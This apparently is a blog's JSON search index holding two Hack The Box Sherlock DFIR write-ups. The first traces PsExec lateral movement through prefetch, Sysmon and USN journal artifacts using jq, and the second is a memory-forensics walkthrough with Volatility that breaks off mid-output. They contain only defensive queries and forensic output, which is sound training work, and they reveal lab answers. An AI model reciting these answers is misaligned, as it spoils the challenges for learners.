{"pages":[{"date":"2025-09-18","image":"","imageAlt":"","link":"https://hshakilst.github.io/posts/htb-sherlocks/tracer/","summary":"Tracer - DFIR Scenario A junior SOC analyst on duty has reported multiple alerts indicating the presence of PsExec on a workstation. They verified the alerts and escalated the alerts to tier II.","tags":["dfir","event","evtx","evtxecmd","htb","jq","log","mftecmd","pecmd","prefetch","sherlock","usnjournal","windows","zimmerman-tools"],"text":"tracer - dfir scenario a junior soc analyst on duty has reported multiple alerts indicating the presence of psexec on a workstation. they verified the alerts and escalated the alerts to tier ii. as an incident responder you triaged the endpoint for artifacts of interest. now please answer the questions regarding this security event so you can report it to your incident manager.\nartifacts artifact md5 hash password remarks tracer.zip 8cceeed93b876b9c60e53a1f2f7a68a1 hacktheblue contains windows event logs, prefetch files and usnjournal files. c/$extend/$j 068a557274548bc88d2a9919c3195983 usnjournal file\u0026rsquo;s ads. 20240620050901_pecmd_output.json 1b3cd6882263b86735ebf0024c1cfa3d converted prefetch files to a single json file format. 20240620051031_evtxecmd_output.json 56c682158bd5e789558cf8a834313b60 converted all the windows .evtx file to a single json file. 20240620054048_mftecmd_j_output.csv 98eb829bfc6d7751aa1a51545a7ed430 converted the usn journal file\u0026rsquo;s ads to a csv file format.Â tools evtxecmd - eric zimmerman tools: to convert the windows event logs into a single json file. pecmd - eric zimmerman tools: to convert the prefetch files into a single json file. mftecmd - eric zimmerman tools: to convert the usn journal\u0026rsquo;s alternate data stream file $j to a csv file format. tasks the soc team suspects that an adversary is lurking in their environment and are using psexec to move laterally. a junior soc analyst specifically reported the usage of psexec on a work station. how many times was psexec executed by the attacker on the system? what is the name of the service binary dropped by psexec tool allowing attacker to execute remote commands? now we have confirmed that psexec ran multiple times, we are particularly interested in the 5th last instance of the psexec. what is the timestamp when the psexec service binary ran? can you confirm the hostname of the workstation from which attacker moved laterally? what is full name of the key file dropped by 5th last instance of the psexec? can you confirm the timestamp when this key file was created on disk? what is the full name of the named pipe ending with the \u0026ldquo;stderr\u0026rdquo; keyword for the 5th last instance of the psexec? forensic analysis for task 1, 2, 3, 4 and 5 we can run the jq lang query on the converted prefetch json file 20240620050901_pecmd_output.json for psexesvc.exe this is the service binary that handles the psexec commands remotely or locally.\n$ cat 20240620050901_pecmd_output.json | jq \u0026#39;select(.executablename==\u0026#34;psexesvc.exe\u0026#34;)\u0026#39; { \u0026#34;sourcefilename\u0026#34;: \u0026#34;prefetch\\\\psexesvc.exe-ad70946c.pf\u0026#34;, \u0026#34;sourcecreated\u0026#34;: \u0026#34;2023-09-08 00:10:04\u0026#34;, \u0026#34;sourcemodified\u0026#34;: \u0026#34;2024-06-20 05:04:51\u0026#34;, \u0026#34;sourceaccessed\u0026#34;: \u0026#34;2024-06-20 05:08:55\u0026#34;, \u0026#34;executablename\u0026#34;: \u0026#34;psexesvc.exe\u0026#34;, \u0026#34;hash\u0026#34;: \u0026#34;ad70946c\u0026#34;, \u0026#34;size\u0026#34;: \u0026#34;18142\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;windows 10 or windows 11\u0026#34;, \u0026#34;runcount\u0026#34;: \u0026#34;9\u0026#34;, \u0026#34;lastrun\u0026#34;: \u0026#34;2023-09-07 12:10:03\u0026#34;, \u0026#34;previousrun0\u0026#34;: \u0026#34;2023-09-07 12:09:09\u0026#34;, \u0026#34;previousrun1\u0026#34;: \u0026#34;2023-09-07 12:08:54\u0026#34;, \u0026#34;previousrun2\u0026#34;: \u0026#34;2023-09-07 12:08:23\u0026#34;, \u0026#34;previousrun3\u0026#34;: \u0026#34;2023-09-07 12:06:54\u0026#34;, \u0026#34;previousrun4\u0026#34;: \u0026#34;2023-09-07 11:57:53\u0026#34;, \u0026#34;previousrun5\u0026#34;: \u0026#34;2023-09-07 11:57:43\u0026#34;, \u0026#34;previousrun6\u0026#34;: \u0026#34;2023-09-07 11:55:44\u0026#34;, \u0026#34;volume0name\u0026#34;: \u0026#34;\\\\volume{01d951602330db46-52233816}\u0026#34;, \u0026#34;volume0serial\u0026#34;: \u0026#34;52233816\u0026#34;, \u0026#34;volume0created\u0026#34;: \u0026#34;2023-03-08 01:48:53\u0026#34;, \u0026#34;directories\u0026#34;: \u0026#34;\\\\volume{01d951602330db46-52233816}\\\\programdata, \\\\volume{01d951602330db46-52233816}\\\\programdata\\\\microsoft, \\\\volume{01d951602330db46-52233816}\\\\programdata\\\\microsoft\\\\crypto, \\\\volume{01d951602330db46-52233816}\\\\programdata\\\\microsoft\\\\crypto\\\\rsa, \\\\volume{01d951602330db46-52233816}\\\\programdata\\\\microsoft\\\\crypto\\\\rsa\\\\s-1-5-18, \\\\volume{01d951602330db46-52233816}\\\\windows, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\u0026#34;, \u0026#34;filesloaded\u0026#34;: \u0026#34;\\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\ntdll.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\psexesvc.exe, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\kernel32.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\kernelbase.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\locale.nls, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\user32.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\userenv.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\win32u.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\ucrtbase.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\gdi32.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\rpcrt4.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\gdi32full.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\msvcp_win.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\advapi32.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\msvcrt.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\sechost.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\shell32.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\wtsapi32.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\kernel.appcore.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\ntmarta.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\psexec-forela-wkstn001-cad5e7ef.key, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\cryptsp.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\rsaenh.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\bcrypt.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\sspicli.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\profapi.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\bcryptprimitives.dll, \\\\volume{01d951602330db46-52233816}\\\\programdata\\\\microsoft\\\\crypto\\\\rsa\\\\s-1-5-18\\\\f05260a40ae771219c4528e4628312cd_b02ec91e-ade1-4f67-9328-ae89b0ebd197, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\cryptbase.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\netapi32.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\logoncli.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\netutils.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\system32\\\\winsta.dll, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\psexec-forela-wkstn001-89a517ee.key, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\psexec-forela-wkstn001-415385df.key, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\psexec-forela-wkstn001-c3e84a44.key, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\psexec-forela-wkstn001-95f03cfe.key, \\\\volume{01d951602330db46-52233816}\\\\$mft, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\psexec-forela-wkstn001-663bcb85.key, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\psexec-forela-wkstn001-7aa5d6c6.key, \\\\volume{01d951602330db46-52233816}\\\\windows\\\\psexec-forela-wkstn001-edcc783c.key\u0026#34;, \u0026#34;parsingerror\u0026#34;: false } a note to count the binary last runs, we should start from the lastrun as 1, previousrun0 as 2 and so on. the order of the filesloaded also follows this rule. the latest run\u0026#39;s loaded files are on top and the first run\u0026#39;s loaded files are in the bottom. to answer the question for task 6 we can search the usn journal records and search for the update reason attribute which is filecreate. ![[pasted image 20240621073521.png]]\nto answer the last task\u0026rsquo;s question we need search for pipeevent (pipe created) which has an event id of 17 and then search for pipe names that ends with stderr and that was created when the last 5th instance of psexec was ran. we can do the following and compare the date created with the last 5th instance\u0026rsquo;s run time.\n$ cat 20240620051031_evtxecmd_output.json | jq \u0026#39;. | select(.timecreated \u0026gt;= \u0026#34;2023-09-07 12:06:54\u0026#34; and .eventid==17) | select(.payloaddata2 | test(\u0026#34;stderr$\u0026#34;))\u0026#39; -c | head -n1 {\u0026#34;payloaddata1\u0026#34;:\u0026#34;processid: 6836, processguid: b02ec91e-bcde-64f9-0c02-000000003000\u0026#34;,\u0026#34;payloaddata2\u0026#34;:\u0026#34;pipename: \\\\psexesvc-forela-wkstn001-3056-stderr\u0026#34;,\u0026#34;payloaddata5\u0026#34;:\u0026#34;image: c:\\\\windows\\\\psexesvc.exe\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;nt authority\\\\system\u0026#34;,\u0026#34;mapdescription\u0026#34;:\u0026#34;pipeevent (pipe created)\u0026#34;,\u0026#34;chunknumber\u0026#34;:5,\u0026#34;computer\u0026#34;:\u0026#34;forela-wkstn002.forela.local\u0026#34;,\u0026#34;payload\u0026#34;:\u0026#34;{\\\u0026#34;eventdata\\\u0026#34;:{\\\u0026#34;data\\\u0026#34;:[{\\\u0026#34;@name\\\u0026#34;:\\\u0026#34;rulename\\\u0026#34;,\\\u0026#34;#text\\\u0026#34;:\\\u0026#34;-\\\u0026#34;},{\\\u0026#34;@name\\\u0026#34;:\\\u0026#34;eventtype\\\u0026#34;,\\\u0026#34;#text\\\u0026#34;:\\\u0026#34;createpipe\\\u0026#34;},{\\\u0026#34;@name\\\u0026#34;:\\\u0026#34;utctime\\\u0026#34;,\\\u0026#34;#text\\\u0026#34;:\\\u0026#34;2023-09-07 12:06:55.069\\\u0026#34;},{\\\u0026#34;@name\\\u0026#34;:\\\u0026#34;processguid\\\u0026#34;,\\\u0026#34;#text\\\u0026#34;:\\\u0026#34;b02ec91e-bcde-64f9-0c02-000000003000\\\u0026#34;},{\\\u0026#34;@name\\\u0026#34;:\\\u0026#34;processid\\\u0026#34;,\\\u0026#34;#text\\\u0026#34;:\\\u0026#34;6836\\\u0026#34;},{\\\u0026#34;@name\\\u0026#34;:\\\u0026#34;pipename\\\u0026#34;,\\\u0026#34;#text\\\u0026#34;:\\\u0026#34;\\\\\\\\psexesvc-forela-wkstn001-3056-stderr\\\u0026#34;},{\\\u0026#34;@name\\\u0026#34;:\\\u0026#34;image\\\u0026#34;,\\\u0026#34;#text\\\u0026#34;:\\\u0026#34;c:\\\\\\\\windows\\\\\\\\psexesvc.exe\\\u0026#34;},{\\\u0026#34;@name\\\u0026#34;:\\\u0026#34;user\\\u0026#34;,\\\u0026#34;#text\\\u0026#34;:\\\u0026#34;nt authority\\\\\\\\system\\\u0026#34;}]}}\u0026#34;,\u0026#34;userid\u0026#34;:\u0026#34;s-1-5-18\u0026#34;,\u0026#34;channel\u0026#34;:\u0026#34;microsoft-windows-sysmon/operational\u0026#34;,\u0026#34;provider\u0026#34;:\u0026#34;microsoft-windows-sysmon\u0026#34;,\u0026#34;eventid\u0026#34;:17,\u0026#34;eventrecordid\u0026#34;:\u0026#34;159603\u0026#34;,\u0026#34;processid\u0026#34;:3552,\u0026#34;threadid\u0026#34;:4360,\u0026#34;level\u0026#34;:\u0026#34;info\u0026#34;,\u0026#34;keywords\u0026#34;:\u0026#34;classic\u0026#34;,\u0026#34;sourcefile\u0026#34;:\u0026#34;.\\\\system32\\\\winevt\\\\logs\\\\microsoft-windows-sysmon%4operational.evtx\u0026#34;,\u0026#34;extradataoffset\u0026#34;:0,\u0026#34;hiddenrecord\u0026#34;:false,\u0026#34;timecreated\u0026#34;:\u0026#34;2023-09-07t12:06:55.0846666+00:00\u0026#34;,\u0026#34;recordnumber\u0026#34;:159603} summary in this sherlock we explored the usn journal and deep dived into windows prefetch files. also, a moderate understanding of psexec commands was necessary to answer the task question. finally, i included some resources to read about more those two above mentioned artifacts.\n","title":"HTB Sherlock Tracer"},{"date":"2024-06-21","image":"","imageAlt":"","link":"https://hshakilst.github.io/posts/htb-sherlocks/mellitus/","summary":"Mellitus - DFIR Scenario Youâve been a SOC analyst for the last 4 years but youâve been honing your incident response skills! Itâs about time you bite the bullet and go for your dream job as an Incident Responder as thatâs the path youâd like your career to follow.","tags":["dfir","dump","event","evtx","evtxecmd","floss","gimp","htb","image","jq","malware","memory","sherlock","volatility","windows","zimmerman-tools"],"text":"mellitus - dfir scenario youâve been a soc analyst for the last 4 years but youâve been honing your incident response skills! itâs about time you bite the bullet and go for your dream job as an incident responder as thatâs the path youâd like your career to follow. currently you are going through the interview process for a medium size incident response internal team and the cocky interviewing responder has given you a tough technical challenge to test your memory forensics aptitude. can you get all the questions right and secure the job?\nartifacts artifact md5 hash password remarks mellitus.zip 0272fd0c8105b555a1ce17d0959b9cb8 hacktheblue memory_dump.vmem 91a4ae43d463bfb9a9806b7716875415 windows memory dump file of a vm instance. memory_dump.vmsn c17f871c05286923eb06d5dcb5136297 vmware snapshot file for the vm instance. tools volatility3 and volatility2 evtxecmd - zimmerman tools jq libreoffice calc gimp 2.10.38 tasks what was the time on the system when the memory was captured? what is the ip address of the attacker? what is the name of the strange process? what is the pid of the process that launched the malicious binary? what was the command that got the malicious binary onto the machine? the attacker attempted to gain entry to our host via ftp. how many users did they attempt? what is the full url of the last website the attacker visited? what is the affected users password? there is a flag hidden related to pid 5116. can you confirm what it is? forensic analysis for task 1 we can analyze the memdump using the following:\n$ vol3 -f memory_dump.vmem windows.info volatility 3 framework 2.7.1 progress: 100.00 pdb scanning finished variable value kernel base 0xf80638aa5000 dtb 0x1ad000 symbols file:///opt/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/8b11040a5928757b11390ac78f6b6925-1.json.xz is64bit true ispae false layer_name 0 windowsintel32e memory_layer 1 vmwarelayer base_layer 2 filelayer meta_layer 2 filelayer kdversionblock 0xf80638ea7dc0 major/minor 15.17763 machinetype 34404 kenumberprocessors 2 systemtime 2023-10-31 13:59:26 ntsystemroot c:\\windows ntproducttype ntproductwinnt ntmajorversion 10 ntminorversion 0 pe majoroperatingsystemversion 10 pe minoroperatingsystemversion 0 pe machine 34404 pe timedatestamp thu oct 28 12:04:50 2060 for the task 2 i used the netscan plugin to get the ip address. but, i should have first found the malicious process and then analyze the process. unfortunately, i couldn\u0026rsquo;t dump the malicious process.\n$ vol3 -f memory_dump.vmem windows.netscan volatility 3 framework 2.7.1 progress: 100.00 pdb scanning finished offset proto localaddr localport foreignaddr foreignport state pid owner created 0xc40aa1be7050 tcpv4 0.0.0.0 135 0.0.0.0 0 listening 880 svchost.exe 2023-10-31 13:30:57.000000 0xc40aa1be71a0 tcpv4 0.0.0.0 49664 0.0.0.0 0 listening 472 wininit.exe 2023-10-31 13:30:57.000000 0xc40aa1be82b0 tcpv4 0.0.0.0 135 0.0.0.0 0 listening 880 svchost.exe 2023-10-31 13:30:57.000000 0xc40aa1be82b0 tcpv6 :: 135 :: 0 listening 880 svchost.exe 2023-10-31 13:30:57.000000 0xc40aa1be8400 tcpv4 0.0.0.0 49664 0.0.0.0 0 listening 472 wininit.exe 2023-10-31 13:30:57.000000 0xc40aa1be8400 tcpv6 :: 49664 :: 0 listening 472 wininit.exe 2023-10-31 13:30:57.000000 0xc40aa5394050 tcpv4 0.0.0.0 49666 0.0.0.0 0 listening 1208 svchost.exe 2023-10-31 13:30:57.000000 0xc40aa5394440 tcpv4 0.0.0.0 49665 0.0.0.0 0 listening 1332 svchost.exe 2023-10-31 13:30:57.000000 0xc40aa53946e0 tcpv4 0.0.0.0 49667 0.0.0.0 0 listening 2328 spoolsv.exe 2023-10-31 13:30:58.000000 0xc40aa53946e0 tcpv6 :: 49667 :: 0 listening 2328 spoolsv.exe 2023-10-31 13:30:58.000000 0xc40aa5394830 tcpv4 0.0.0.0 49665 0.0.0.0 0 listening 1332 svchost.exe 2023-10-31 13:30:57.000000 0xc40aa5394830 tcpv6 :: 49665 :: 0 listening 1332 svchost.exe 2023-10-31 13:30:57.000000 0xc40aa5394ad0 tcpv4 0.0.0.0 49676 0.0.0.0 0 listening 636 lsass.exe 2023-10-31 13:31:07.000000 0xc40aa5394ad0 tcpv6 :: 49676 :: 0 listening 636 lsass.exe 2023-10-31 13:31:07.000000 0xc40aa5394ec0 udpv4 192.168.157.144 137 * 0 4 system 2023-10-31 13:30:57.000000 0xc40aa5395160 tcpv4 0.0.0.0 49667 0.0.0.0 0 listening 2328 spoolsv.exe 2023-10-31 13:30:58.000000 0xc40aa53952b0 tcpv4 192.168.157.144 139 0.0.0.0 0 listening 4 system 2023-10-31 13:30:57.000000 0xc40aa5395400 udpv4 192.168.157.144 138 * 0 4 system 2023-10-31 13:30:57.000000 0xc40aa5395550 udpv4 0.0.0.0 5353 * 0 1876 svchost.exe 2023-10-31 13:30:58.000000 0xc40aa5395550 udpv6 :: 5353 * 0 1876 svchost.exe 2023-10-31 13:30:58.000000 0xc40aa53956a0 udpv4 0.0.0.0 5353 * 0 1876 svchost.exe 2023-10-31 13:30:58.000000 0xc40aa5395940 tcpv4 0.0.0.0 49676 0.0.0.0 0 listening 636 lsass.exe 2023-10-31 13:31:07.000000 0xc40aa5395a90 tcpv4 0.0.0.0 49666 0.0.0.0 0 listening 1208 svchost.exe 2023-10-31 13:30:57.000000 0xc40aa5395a90 tcpv6 :: 49666 :: 0 listening 1208 svchost.exe 2023-10-31 13:30:57.000000 0xc40aa5395be0 udpv4 0.0.0.0 0 * 0 1876 svchost.exe 2023-10-31 13:30:58.000000 0xc40aa5395be0 udpv6 :: 0 * 0 1876 svchost.exe 2023-10-31 13:30:58.000000 0xc40aa5395d30 tcpv6 ::1 8888 :: 0 listening 2896 python.exe 2023-10-31 13:37:16.000000 0xc40aa58f3050 tcpv4 0.0.0.0 49668 0.0.0.0 0 listening 620 services.exe 2023-10-31 13:30:59.000000 0xc40aa58f3ec0 udpv4 0.0.0.0 5050 * 0 3728 svchost.exe 2023-10-31 13:31:00.000000 0xc40aa58f4160 udpv4 127.0.0.1 64872 * 0 3236 svchost.exe 2023-10-31 13:30:59.000000 0xc40aa58f4940 tcpv4 0.0.0.0 445 0.0.0.0 0 listening 4 system 2023-10-31 13:30:59.000000 0xc40aa58f4940 tcpv6 :: 445 :: 0 listening 4 system 2023-10-31 13:30:59.000000 0xc40aa58f4a90 tcpv4 0.0.0.0 49668 0.0.0.0 0 listening 620 services.exe 2023-10-31 13:30:59.000000 0xc40aa58f4a90 tcpv6 :: 49668 :: 0 listening 620 services.exe 2023-10-31 13:30:59.000000 0xc40aa5ac6530 tcpv4 127.0.0.1 49867 127.0.0.1 49868 established - - n/a 0xc40aa5d25a30 tcpv4 192.168.157.144 50043 142.250.187.206 443 established - - n/a 0xc40aa5efe050 tcpv6 ::1 14147 :: 0 listening 11048 filezillaserve 2023-10-31 13:37:41.000000 0xc40aa5efe1a0 tcpv6 7f00:1::9870:b5a1:ac4:ffff 8005 :: 0 listening 2696 java.exe 2023-10-31 13:37:50.000000 0xc40aa5efe2f0 tcpv4 0.0.0.0 443 0.0.0.0 0 listening 11204 httpd.exe 2023-10-31 13:37:41.000000 0xc40aa5efe2f0 tcpv6 :: 443 :: 0 listening 11204 httpd.exe 2023-10-31 13:37:41.000000 0xc40aa5efe590 udpv4 0.0.0.0 0 * 0 6772 powershell.exe 2023-10-31 13:42:37.000000 0xc40aa5efe830 tcpv4 0.0.0.0 7680 0.0.0.0 0 listening 8444 svchost.exe 2023-10-31 13:32:59.000000 0xc40aa5efe830 tcpv6 :: 7680 :: 0 listening 8444 svchost.exe 2023-10-31 13:32:59.000000 0xc40aa5efe980 tcpv4 0.0.0.0 21 0.0.0.0 0 listening 11048 filezillaserve 2023-10-31 13:37:41.000000 0xc40aa5efed70 tcpv4 0.0.0.0 443 0.0.0.0 0 listening 11204 httpd.exe 2023-10-31 13:37:41.000000 0xc40aa5eff160 tcpv4 127.0.0.1 14147 0.0.0.0 0 listening 11048 filezillaserve 2023-10-31 13:37:41.000000 0xc40aa5eff400 tcpv4 0.0.0.0 8080 0.0.0.0 0 listening 2696 java.exe 2023-10-31 13:37:48.000000 0xc40aa5eff400 tcpv6 :: 8080 :: 0 listening 2696 java.exe 2023-10-31 13:37:48.000000 0xc40aa5effd30 tcpv4 0.0.0.0 3306 0.0.0.0 0 listening 5212 mysqld.exe 2023-10-31 13:37:41.000000 0xc40aa5effd30 tcpv6 :: 3306 :: 0 listening 5212 mysqld.exe 2023-10-31 13:37:41.000000 0xc40aa5effe80 tcpv4 0.0.0.0 21 0.0.0.0 0 listening 11048 filezillaserve 2023-10-31 13:37:41.000000 0xc40aa5effe80 tcpv6 :: 21 :: 0 listening 11048 filezillaserve 2023-10-31 13:37:41.000000 0xc40aa60fc1a0 udpv6 ::1 1900 * 0 8140 svchost.exe 2023-10-31 13:31:20.000000 0xc40aa60fc2f0 udpv6 ::1 56182 * 0 8140 svchost.exe 2023-10-31 13:31:20.000000 0xc40aa60fc440 udpv4 127.0.0.1 1900 * 0 8140 svchost.exe 2023-10-31 13:31:20.000000 0xc40aa60fc6e0 udpv4 192.168.157.144 56183 * 0 8140 svchost.exe 2023-10-31 13:31:20.000000 0xc40aa60fcad0 udpv4 192.168.157.144 1900 * 0 8140 svchost.exe 2023-10-31 13:31:20.000000 0xc40aa60fd6a0 udpv6 fe80::a94d:3c5d:b0c7:221b 56181 * 0 8140 svchost.exe 2023-10-31 13:31:20.000000 0xc40aa60fd7f0 udpv4 127.0.0.1 56184 * 0 8140 svchost.exe 2023-10-31 13:31:20.000000 0xc40aa60fd940 tcpv4 127.0.0.1 8888 0.0.0.0 0 listening 2896 python.exe 2023-10-31 13:37:16.000000 0xc40aa60fda90 udpv6 fe80::a94d:3c5d:b0c7:221b 1900 * 0 8140 svchost.exe 2023-10-31 13:31:20.000000 0xc40aa60fdd30 tcpv4 0.0.0.0 80 0.0.0.0 0 listening 11204 httpd.exe 2023-10-31 13:37:41.000000 0xc40aa60fde80 tcpv4 0.0.0.0 80 0.0.0.0 0 listening 11204 httpd.exe 2023-10-31 13:37:41.000000 0xc40aa60fde80 tcpv6 :: 80 :: 0 listening 11204 httpd.exe 2023-10-31 13:37:41.000000 0xc40aa615a980 tcpv4 0.0.0.0 5040 0.0.0.0 0 listening 3728 svchost.exe 2023-10-31 13:31:02.000000 0xc40aa6b569a0 tcpv4 192.168.157.144 49772 20.90.152.133 443 established - - n/a 0xc40aa6f40b50 tcpv4 127.0.0.1 49868 127.0.0.1 49867 established - - n/a 0xc40aa9005bf0 tcpv4 127.0.0.1 14147 127.0.0.1 49889 established - - n/a 0xc40aa90e0bf0 tcpv4 127.0.0.1 49889 127.0.0.1 14147 established - - n/a 0xc40aa912ebe0 tcpv4 192.168.157.144 50042 216.58.204.67 443 established - - n/a 0xc40aa98d66a0 tcpv4 192.168.157.144 49920 95.101.243.61 443 closed - - n/a 0xc40aa98e1950 tcpv4 192.168.157.144 49921 95.101.63.170 443 closed - - n/a 0xc40aa99986d0 tcpv4 192.168.157.144 50045 13.107.21.200 443 established - - n/a 0xc40aaa0fa050 udpv4 0.0.0.0 0 * 0 6772 powershell.exe 2023-10-31 13:42:37.000000 0xc40aaa0fa050 udpv6 :: 0 * 0 6772 powershell.exe 2023-10-31 13:42:37.000000 0xc40aaa0fa1a0 udpv4 0.0.0.0 5355 * 0 1876 svchost.exe 2023-10-31 13:55:22.000000 0xc40aaa0fa440 udpv4 0.0.0.0 5353 * 0 8048 chrome.exe 2023-10-31 13:55:31.000000 0xc40aaa0fa590 udpv4 0.0.0.0 0 * 0 6772 powershell.exe 2023-10-31 13:42:37.000000 0xc40aaa0fac20 udpv4 0.0.0.0 5353 * 0 8048 chrome.exe 2023-10-31 13:55:31.000000 0xc40aaa0fac20 udpv6 :: 5353 * 0 8048 chrome.exe 2023-10-31 13:55:31.000000 0xc40aaa0fb160 udpv4 0.0.0.0 5355 * 0 1876 svchost.exe 2023-10-31 13:55:22.000000 0xc40aaa0fb160 udpv6 :: 5355 * 0 1876 svchost.exe 2023-10-31 13:55:22.000000 0xc40aaa0fba90 udpv4 0.0.0.0 0 * 0 6772 powershell.exe 2023-10-31 13:42:37.000000 0xc40aaa0fba90 udpv6 :: 0 * 0 6772 powershell.exe 2023-10-31 13:42:37.000000 0xc40aaa5d7920 tcpv4 192.168.157.144 50044 204.79.197.222 443 established - - n/a 0xc40aaa7f79a0 tcpv4 192.168.157.144 50037 192.168.157.151 4545 established - - n/a 0xc40aaa8cb8a0 tcpv4 192.168.157.144 50041 216.58.204.78 443 established - - n/a 0xc40aaa8d7920 tcpv4 192.168.157.144 50039 20.31.169.57 443 closed - - n/a i tried to find the malicious process but i couldn\u0026rsquo;t find any weird looking process. my mind tricked me. so, i did a ip ioc search using yara.\n$ vol3 -f memory_dump.vmem windows.vadyarascan --yara-rules \u0026#34;192.168.157.151\u0026#34; volatility 3 framework 2.7.1 progress: 100.00 pdb scanning finished offset pid rule component value 0x12326865bdb 3360 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x12330fabadb 3360 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x12330fadaa0 3360 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x12330fb7b1e 3360 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x12330fb9ae0 3360 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x123373fc8a0 3360 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x1233f9c69f0 3360 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x61008b 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x6100e3 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x61013b 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x61034b 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x6105b3 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x6106c9 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x6108a1 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x6108ec 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x61093c 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x6109dc 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x610a31 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x610b6c 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x610bc1 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x610c11 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x610c61 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x610f2c 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x610fc3 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x611021 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x787b0c 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78b03b 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78b0cb 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78b23c 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78b30b 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78b361 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78b3a9 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78b3ec 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78b50c 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78b554 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78b593 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78b5db 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78b623 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31 0x78bac1 11048 r1 $a 31 39 32 2e 31 36 38 2e 31 35 